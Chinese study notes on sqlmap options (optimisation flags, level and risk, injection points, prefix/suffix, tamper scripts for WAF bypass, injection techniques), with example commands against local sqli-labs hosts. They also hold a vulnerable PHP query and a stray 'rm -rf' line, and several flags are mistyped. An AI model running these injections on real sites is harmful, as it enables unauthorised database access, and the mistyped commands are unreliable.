# 一.sql性能优化
# 1. sqlmap设置持久HTTP连接
    长连接 connection: keep-alive
    python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --keep-alive --banner -v 5
    --keep-alive 和 --proxy 有冲突的，不能同时使用

# 2. sqlmap设置不接收HTTP Body
    参数 --null-connection
    如何在虚拟机连接本地网址 192.168.1.4/sqli
    sqlmap中设置空连接,表示不接受HTTP当中的Body。 可以直接获得HTTP响应的大小而不用获得HTTP响应体,常用在盲注过程中

# 3. sqlmap设置多线程
    参数 --thread
    默认1
# 4. 一键优化
    -o 添加此参数相当于同时添加下列三个优化参数

    --keep-alive
    --null-connection
    --threads=3

# 5. sqlmap自定义检测参数
# 5.1 sqlmap设置探测等级
    参数：--level
    此参数用于指定检测级别，有1~5共5级。默认为1，表示做最少的检测，相应的，5级表示 做最多的检测。
    python sqlmap.py -hh
    --level=LEVEL(1-5, defalut 1)
    --risk=RISK (1-3, default 1)
    rm -rf/+文件地址 删除文件
# 5.2 sqlmap设置风险等级
    参数：–-risk

    此参数用于指定风险等级，有1~3共3级。默认风险等级为1,此等级在大多数情况下对测试目标无害。
    风险等级2添加了基于时间的注入测试,等级3添加了OR测试。

# 6.sqlmap指定位置注入
# 6.1 sqlmap设置指定注入参数
    默认情况下Sqlmap会测试所有GET参数和POST参数，当level大于等于2时会测试cookie参数， 当level大于等于3时会测试User-Agent和Referer。实际上还可以手动指定一个以逗号分隔的、 要测试的参数列表，该列表中的参数不受level限制。这就是“-p”的作用。
    如果不想测试某一参数则可以使用 --skip。
    python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -p "id, user agent" -banner
    kali: sqlmap -u "http://192.168.1.4/sqli/Less-1/?id=1&us=1&usname=admin" -p "us,usname" --banner
    kali: sqlmap -u "http://192.168.1.4/sqli/Less-1/?id=1" --level 5 --skip="user-agent,referer" --banner
# 6.1 Sqlmap设置URI注入位置
    当注入点位于URI本身内部时，会出现一些特殊情况。除非手动指向URI路径，否则sqlmap不会对URI路径
    执行任何自动测试。必须在命令行中添加星号(*)来指定这些注入点。

    python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"  --banner
    python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1*&us=1&uname=admin" --banner --banner

# 7. sqlmap注入参数
# 7.1 sqlmap强制设置DBMS
    默认情况下sqlmap会自动识别探测目标web应用程序的后端数据库管理系统(DBMS),sqlmap支持 的DBMS种类
    python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --dbs mysql --banner
    python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --DB2 mysql --banner

# 7.2 sqlmap强制设置OS系统
    默认情况下sqlmap会自动探测目标web应用程序的后端操作系统,sqlmap完全支持的OS种类Linux、 Windows

    参数 --os 系统类型
    python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --dbs mysql --os windows
    # 探测结果少
    python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --dbs mysql --os linux

# 7.3 Sqlmap强制设置无效值替换
    参数：--invalid-bignum
    在sqlmap需要使原始参数值无效(例如id=13)时，它使用经典的否定(例如id=-13)。
    有了这个参数，就可以强制使用大整数值来实现相同的目标(例如id=99999999)。

    python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1 and 恶意SQL语句" -- os linux
    python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --invalid-bignum --banner

    参数：--invalid-logical
    有了这个参数，就可以强制使用布尔操作来实现相同的目标(例如id=13 and18=19)。

    参数：--invalid-string
    有了这个参数，就可以强制使用随机字符串来实现相同的目标(例如id=akewmc)。

# 8.Sqlmap自定义注入负载位置
    在某些情况下，只有当用户提供要附加到注入负载的特定后缀时，易受攻击的参数才可被利用。当用户已经知道查询语法并希望通过直接提供注入有效负载前缀和后缀来检测和利用SQL注入时，这些选项就派上用场了。
    --prefix 设置SQL注入Payload前缀
    --suffix 设置SQL注入Payload后缀

$query = "SELECT * FROM users WHERE id=('.$_GET['id'].') LIMIT 0, 1";

python sqlmap.py -u "http://ip/sqlmap/mysql/get_str_brackets.php\
?id=1" -p id --prefix "')" --suffix " AND ('abc'='abc"

$query = "SELECT * FROM users WHERE id=('1') <PAYLOAD> AND ('abc'='abc') LIMIT 0, 1";

python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -p id --prefix "')" --suffix " AND ('abc'='abc"

# 9.Sqlmap设置Tamper脚本
sqlmap本身不会混淆发送的有效负载，除了单引号之间的字符串被CHAR()类似的表示形式所取代之外。sqlmap通过Tamper脚本来绕过WAF等防御措施，
可以在tamper文件夹下找到所有sqlmap自带的tamper脚本。
python sqlmap.py -u "http://ip/sqlmap/mysql/get_int.php?id=1" --tamper "between.py,randomcase.py,space2comment.py" -v 3

# 10. Sqlmap设置DBMS认证
设置DBMS认证方式通过以下命令：
--dbms-cred = username:password
python sqlmap.py -u "http://127.0.0.1/sqli/Less-3/?id=1" --dbms-cred = "root:root" --banner

# 二. sqlmap注入技术参数
1. sqlmap设置具体SQL注入技术
参数 --technique
此参数用于指定检测注入时所用技术。默认情况下Sqlmap会使用自己支持的全部技术进行 检测。 此参数后跟表示检测技术的大写字母,其值为B、E、U、S、T或Q,含义如下：

B：Boolean-based blind（布尔型注入）
python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --technique B --current-db
E：Error-based（报错型注入）
U：Union query-based（可联合查询注入）
S：Stacked queries（可多语句查询注入）
T：Time-based blind（基于时间延迟注入）
Q：Inline queries（嵌套查询注入）
可以用“–technique ES”来指定使用两种检测技术。“–technique BEUSTQ”与默认情况等效。

# 2. sqlmap设置时间盲注延迟时间
参数：–time-sec
用此参数设置基于时间延迟注入中延时时长，默认为5秒
python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --current-db -v 5
python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --current-db --time-sec 3

# 3. sqlmap设置union字段数
在进行联合查询注入时,Sqlmap会自动检测列数,范围是1到10。当level值较高时列数检测范 围的上限会扩大到50。
可以用此参数指定列数检测范围，如--union-cols 12-16就会让Sqlmap的列数检测范围变成 12到16。

python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --technique U --current-db -v 3 --union-clos 12-18

# 4. sqlmap设置union字符
参数：–union-char
默认情况下Sqlmap进行联合查询注入时使用空字符(NULL)。但当level值较高时Sqlmap会生 成随机数用于联合查询注入。 因为有时使用空字符注入会失败而使用随机数会成功。
# 上一步所有的Null变成123
python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --technique U --current-db -v 3 --union-clos 12-18 --union-char 123

# 5. sqlmap设置union查询表
参数：–union-from
有些情况下在联合查询中必须指定一个有效和可访问的表名,否则联合查询会执行失败
python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --technique U --current-db -v 3 --union-clos 12-18 --union-char 123 --union-from users

# 6. sqlmap识别指纹
探测目标指纹信息
参数 -f或者--fingerprint

python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -f         # 和--banner类似
python sqlmap.py -hh
